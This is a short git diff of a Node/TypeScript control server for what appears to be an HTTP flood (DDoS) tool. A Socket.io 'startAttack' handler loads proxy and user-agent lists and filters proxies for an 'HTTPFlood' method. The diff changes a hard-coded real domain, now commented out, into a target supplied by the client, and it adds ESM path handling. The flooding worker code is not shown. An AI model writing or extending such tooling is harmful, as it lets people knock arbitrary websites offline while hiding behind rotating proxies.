@@ -2,12 +2,15 @@ import express from "express";
 import {createServer} from "http";
 import {Server} from "socket.io";
 import {Worker} from "worker_threads";
-import {join} from "path";
+import {dirname, join} from "path";
 import {AttackMethod, AttackWorker} from "./types";
 import {filterProxies} from "./utils/proxy";
 import {loadProxies, loadUserAgents} from "./utils/file";
+import {fileURLToPath} from "url";
 
 const PORT = process.env.PORT || 3000;
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = dirname(__filename);
 const __prod = process.env.NODE_ENV === "production";
 
 const app = express();
@@ -30,8 +33,11 @@ io.on("connection", (socket) => {
     console.log("Client connected");
 
     socket.on("startAttack", (params) => {
-        // const {target, duration, packetDelay, attackMethod, packetSize} = params;
-        const target = 'https://shg2.radolyn.com';
+        // const {target, duration, packetDelay, packetSize} = params;
+        const {target} = params;
+        // const target = 'https://shg2.radolyn.com';
+
+
         const filteredProxies = filterProxies(loadProxies(), AttackMethod.HTTPFlood);
         const userAgents = loadUserAgents();
         const duration = 2;
